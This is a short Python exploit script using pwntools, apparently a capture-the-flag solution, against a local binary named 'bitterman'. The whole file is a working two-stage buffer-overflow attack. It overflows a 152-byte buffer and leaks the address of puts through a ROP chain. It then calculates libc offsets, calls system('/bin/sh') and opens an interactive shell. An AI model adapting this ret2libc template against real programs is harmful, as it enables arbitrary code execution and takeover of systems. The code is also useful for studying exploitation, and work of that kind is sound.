from pwn import *

context(os='linux', arch='amd64')
p = process("./bitterman")

buff = b"A"*152

# STAGE 1 Exploit
plt_main = p64(0x4006ec)
plt_put = p64(0x400520)
got_put = p64(0x600c50)
pop_rdi = p64(0x400853)

payload = buff + pop_rdi + got_put + plt_put + plt_main

p.recvuntil("name?")
p.sendline("name")
p.recvuntil("message:")
p.sendline("512")
p.recvuntil("text:")
p.sendline(payload)
p.recvuntil("Thanks!")

leaked_puts = p.read()[:8]
log.success("LEAKED puts addr: " + str(leaked_puts))
leaked_puts = u64(leaked_puts)

libc_puts = 0x72a40
libc_syst = 0x45380
libc_bin = 0x184519

offset = leaked_puts - libc_puts

pop_rdi = p64(0x400853)
sys = p64(offset + libc_syst)
sh = p64(offset + libc_bin)

payload = buff + pop_rdi + sh + sys

p.sendline("name")
p.recvuntil("message:")
p.sendline("512")
p.recvuntil("text:")
p.sendline(payload)
p.recvuntil("Thanks!")

p.interactive()
